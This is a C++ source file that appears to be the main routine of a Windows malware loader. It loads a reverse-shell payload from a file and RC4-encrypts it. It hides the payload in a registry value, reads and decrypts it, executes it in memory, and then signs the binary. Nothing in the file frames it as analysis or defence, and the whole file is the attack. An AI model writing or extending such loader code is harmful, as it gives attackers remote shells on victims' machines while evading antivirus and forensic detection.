#include "registry_utils.h"
#include "shellcode_handler.h"
#include "rc4.h"
#include "binary_signer.h"
#include "generate_shellcode.h"
#include "config.h"
#include <iostream>
#include <vector>

int main() {
    std::string registryKey = config::registryKey;
    std::string valueName = config::valueName;

    // Step 1: Generate or load shellcode from a file
    std::vector<uint8_t> shellcode = GenerateShellcode("shellcode/reverse_shell.bin");
    if (shellcode.empty()) {
        std::cerr << "Failed to generate or load shellcode.\n";
        return 1;
    }

    // Step 2: Optionally encrypt the shellcode using RC4 encryption
    RC4EncryptDecrypt(shellcode, config::encryptionKey);
    std::cout << "Shellcode encrypted.\n";

    // Step 3: Write the encrypted shellcode to the Windows registry
    if (WriteShellcodeToRegistry(registryKey, valueName, shellcode.data(), shellcode.size())) {
        std::cout << "Encrypted shellcode written to registry successfully.\n";
    }
    else {
        std::cerr << "Failed to write shellcode to registry.\n";
        return 1;
    }

    // Step 4: Read the encrypted shellcode from the registry
    BYTE buffer[1024];
    if (ReadShellcodeFromRegistry(registryKey, valueName, buffer, sizeof(buffer))) {
        std::cout << "Shellcode read from registry successfully.\n";
    }
    else {
        std::cerr << "Failed to read shellcode from registry.\n";
        return 1;
    }

    // Step 5: Decrypt the shellcode after reading from the registry
    std::vector<uint8_t> decryptedShellcode(buffer, buffer + shellcode.size());
    RC4EncryptDecrypt(decryptedShellcode, config::encryptionKey);  // Decrypt using the same key
    std::cout << "Shellcode decrypted.\n";

    // Step 6: Execute the shellcode
    ExecuteShellcode(decryptedShellcode.data(), decryptedShellcode.size());

    // Step 7: Optionally sign the binary executable
    if (SignBinary(config::binaryFilePath)) {
        std::cout << "Binary signed successfully.\n";
    }
    else {
        std::cerr << "Failed to sign binary.\n";
    }

    return 0;
}
